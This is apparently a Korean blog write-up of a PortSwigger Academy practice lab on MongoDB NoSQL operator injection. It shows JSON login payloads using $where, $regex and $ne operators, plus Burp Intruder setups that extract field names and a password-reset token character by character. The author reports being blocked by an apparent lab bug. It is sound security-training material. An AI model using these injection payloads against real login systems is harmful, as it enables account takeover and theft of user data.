---
layout: post
title: "Burp Academy-NoSQLi 관련 취약점: Exploiting NoSQL operator injection to extract unknown fields"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, SQLi, NoSQL, NoSQL injecition]
toc: true
last_modified_at: 2023-10-20 09:50:00 +0900
---

# 개요
- 새로 추가된 NoSQL인젝션 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
- 취약점 설명페이지: https://portswigger.net/web-security/nosql-injection
- 난이도: PRACTITIONER (보통)

# 문제 설명
- 문제 서버는 MongoDB NoSQL 데이터베이스를 사용하고 있고, NoSQL 인젝션이 가능하다. 
- calors 유저로 로그인하면 문제가 풀린다. 
- Tip: 문제를 풀려면 먼저 carlos의 패스워드 리셋토큰을 얻어내야 한다. 
- 이번에는 로그인가능한 다른 유저의 크레덴셜이 주어지지 않았다. 😐

```
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, log in as carlos.

Tip
To solve the lab, you'll first need to exfiltrate the value of the password reset token for the user carlos.
```

# 테크닉: MongoDB 에서 Operator삽입하기 🚀

다음과 같은 json 타입의 POST 요청을 받는 서버가 있다고 하자. 

```json
{"username":"wiener","password":"peter"}
```

Operator인젝션을 할 수 있는지 테스트 하려면 다음과 같은 페이로드를 사용할 수 있다. 

```json
{"username":"wiener","password":"peter", "$where":"0"}
```

```json
{"username":"wiener","password":"peter", "$where":"1"}
```

만약 서버 응답에 차이가 있다면 `$where` 절에 삽입한 Javascript가 서버측에서 실행되었다(인젝션 가능하다)라고 추측할 수 있다. 

## 필드 이름 추출하기 💣

Operator인젝션으로 Javascript실행이 가능한 것을 알았다면, `keys()` 함수를 써서 데이터 필드의 이름을 알아내는 것이 가능하다. 예를 들면 다음 페이로드는 오브젝트가 가지고 있는 첫번째 데이터필드의 첫번째 문자를 리턴한다. 이 것을 반복하면 모든 필드 이름을 추출할 수 있다. 

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

# 살펴보기 
## 패스워드 분실시 
패스워드를 잊어버렸을 때 사용하는 링크가 있다. 여기에 carlos를 입력하면 이메일로 보내진 링크를 확인하라고 화면에 표시된다. 

```
Please check your email for a reset password link.
```

## 로그인

로그인할 때 다음 요청이 전송된다. 

```http
POST /login HTTP/2
Host: 0aa90065046ae42c80091cd600670089.web-security-academy.net
Cookie: session=wx24ljx4KeubegdkdZlXt2RuKnPsPgqK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0aa90065046ae42c80091cd600670089.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa90065046ae42c80091cd600670089.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":"wiener","password":"peter"}
```


# 풀이 
## 인젝션 가능한 곳 찾기 
### `$where` 오퍼레이터 테스트
이번 문제는 오퍼레이터 인젝션을 사용하는 문제이다. 일단 로그인 요청(POST /login)에서 다음 두 개 페이로드를 각각 사용했을 때 서버측 동작에 차이가 있는지 확인해보자.

```json
{"username":"carlos","password":"peter", "$where":"0"}
{"username":"carlos","password":"peter", "$where":"1"}
```

다음과 같은 응답이 돌아왔다. 일부 발췌한 내용이다. `Invalid username or password`가 표시된다. 

```html
                   <section>
                        <p class=is-warning>Invalid username or password</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <a href=/forgot-password>Forgot password?</a>
                            <br/>
                            <button class=button onclick="event.preventDefault(); jsonSubmit('/login')"> Log in </button>
                            <script src='/resources/js/login.js'></script>
                        </form>
                    </section>
```

두 개 페이로드를 사용했을 때 서버측 응답에 차이는 없었다. (완벽히 동일했다.) 

### `$regex` 오퍼레이터 사용가능한지 테스트
`$regex` 오퍼레이터를 사용한 다음 페이로드는 어떨까? 만약 사용했을 때와 사용하지 않았을 때 응답이 다르면 regex `$regex` 오퍼레이터를 사용할 수 있다고 볼 수 있다. 

```json
{"username":"carlos","password":{"$regex":"^.*"}}
```

이번에는 다음과 같은 응답이 돌아왔다.  `Account locked: please reset your password` 가 표시된다.  

```html
                   <section>
                        <p class=is-warning>Account locked: please reset your password</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <a href=/forgot-password>Forgot password?</a>
                            <br/>
                            <button class=button onclick="event.preventDefault(); jsonSubmit('/login')"> Log in </button>
                            <script src='/resources/js/login.js'></script>
                        </form>
                    </section>
```

계정이 잠겨버린 것일까? 그러나 일반적인 로그인 페이로드를 사용해서 다시 요청을 보내보면 다시 `Invalid username or password`가 표시된다. 실제로 계정이 잠긴 것은 아닌 것 같다. `$regex` 오퍼레이터를 사용가능한 것으로 보인다. 

## Intruder를 사용한 테스트 
Intruder를 사용해서 다음을 페이로드를 테스트해본다. 패스워드가 a부터시작하는지 체크하는 정규표현식이다. 

```json
{"username":"carlos","password":{"$regex":"^a*"}}
```

테스트해본다. a를 페이로드로 추가한다. 

![Intruder세팅1](/images/burp-academy-nosqli-4-1.png)

a부터z까지를 테스트하기 위해서 bruteforcer를 사용하였다. 

![Intruder세팅2](/images/burp-academy-nosqli-4-2.png)

결과를 보면 a일때만 응답이 다른 것을 알 수 있다. 즉 페이로드가 `{"username":"carlos","password":{"$regex":"^a*"}}`일 때는 `Account locked: please reset your password`가 표시되지만, 기타 `{"username":"carlos","password":{"$regex":"^b*"}}`와 같은 페이로드일 떄는 `Invalid username or password`가 표시된다. 이거 왠지 인젝션이 되는 것 같다. 이어서 패스워드의 두번째 문자를 테스트해보자. 

![결과](/images/burp-academy-nosqli-4-3.png)

### 반복해서 테스트하기 
이어서 두번째 문자를 알아내 보자. 다음 페이로드를 사용한다. 

 `{"username":"carlos","password":{"$regex":"^aa*"}}`

 음.. 그런데 두번째부터는 모든 문자에 대해서 동일한 응답  `Invalid username or password`가 표시된다. 뭔가가 잘못된 것 같다. 다시 생각해본다...


 ## 패스워드 길이 알아내기
 일단 패스워드 길이를 알아내보자. [여기](https://webapppentestguidelines.github.io/newtechtestdoc/docs/nosql_injection/)에 의하면 `{"$regex":"^.{7}$"}` 와 같은 페이로드를 사용할 수 있는 것 같다. (패스워드가 7자리인지 체크하는 페이로드이다.) 

음... 그런데 패스워드 길이를 4부터 12까지 체크해봤는데 응답이 동일하다. 

❓ 그런데 regex도 잘 살펴보면 끝이 `*` 로 끝나는 것이 있고, `$`로 끝나는 것이 있다. 의미가 어떻게 다른걸까? 기본적으로 정규표현식에서는  `$`가 데이터의 끝을 의미한다고 알고 있다. `*`는 0회 이상을 의미한다. `^.{7}$`는 "문자열의 시작부터 끝까지 문자수가 7개" 라는 의미로 이해할 수 있다. `^.{7}*`는 "7개의 문자로 시작하는 패턴이 1회이상" 이라는 의미가 되는 것 같다. 

참고로 Javascript에서는 `^.{7}*`와 같은 정규표현식은 에러로 처리하는 것 같다. 

![정규표현식 에러](/images/burp-academy-nosqli-4-regex-error.png)

음.. 모르겠다. 답을 보고 풀자. 

# 답보고 풀기
1. 패스워드 파라메터를 `{"$ne":"invalid"}` 로 보내본다. 그러면 `Account locked` 메세지가 응답된다. `$ne` 오퍼레이터를 사용할 수 있는 것을 알았다. 

2. 패스워드 리셋은 이메일을 확인할 필요가 있으므로 이 랩에서는 확인할 수가 없다. 

3. 로그인시의 페이로드에 `"$where": "0"`도 추가해본다. 즉, `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`를 보내보고, `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}`도 보내본다. 

그러면 `"$where": "1"`를 보냈을 때 `Invalid username or password` 대신에 `Account locked`가 응답되는 것을 볼 수 있다. `$where`오퍼레이터도 사용할 수 있는 것을 알았다. 

4. HTTP 요청을 Intruder로 보낸다. 
1) `$where` 파라메터를 `"$where":"Object.keys(this)[1].match('^.{}.*')"`로 바꾼다. 

2) 다음과 같이 파라메터 포지션을 두 개 추가한다. `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"` 첫번째는 문자열의 순번을 의미하고, 두번째는 문자 자체를 의미한다. 

3) attack type은 Cluster bomb를 선택한다. 

![파라메터 설정](/images/burp-academy-nosqli-4-4.png)

4) 페이로드셋1은 숫자(Numbers)를 선택한다. 0부터 20까지 지정한다. 

![페이로드셋1 설정](/images/burp-academy-nosqli-4-5.png)

5) 페이로드셋2는 Simple List를 선택한다. a-z, A-Z, 0-9 를 선택한다. 

![페이로드셋2 설정](/images/burp-academy-nosqli-4-6.png)

6) Stark attack을 클릭한다. 
7) 결과를 Payload 1, Length 로 정렬한다. 그러면 파라메터명이 `username`인 것을 알 수 있다. 

![Intruder공격 결과](/images/burp-academy-nosqli-4-8.png)

같은 요령으로 `"$where":"Object.keys(this)[2].match('^.{}.*')"` 도 시도해본다. 오브젝트가 가지고 있는 파라메터들 중에서 두번째 것을 얻어오라는 의미이다. 테스트해보면 password인 것을 알 수 있다. 즉, 첫번째 파라메터(인덱스0)은 id, 두번째 파라메터(인덱스 1)은 username, 세번째 파라메터(인덱스 2)는 password인 것을 알 수 있다. 

그런데 네번째 파라메터(인덱스 3)부터는 500에러가 발생한다. 이럴 수가 없는데.. 왜 그러지하고 다른 사람이 푼 Write-up을 찾아보니 거기에서는 네번째도 200응답을 보내준다. 문제 서버가에 뭔가 버그가 있는 것 같다. 

일단 풀이 방법 자체는 이해했으므로 알려진 토큰 파라메터를 사용한다. `resetToken`

`{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.resetToken.match('^.{§3§}§a§.*')"}`

음... 500에러가 발생한다. 다른 문제 서버로 테스트해본다. 안된다. 동일한 문제가 있다고 하는 질문도 있는 것을 봐서 현재 발생중인 버그 같다. 나중에 다시 시도해보자. 

😥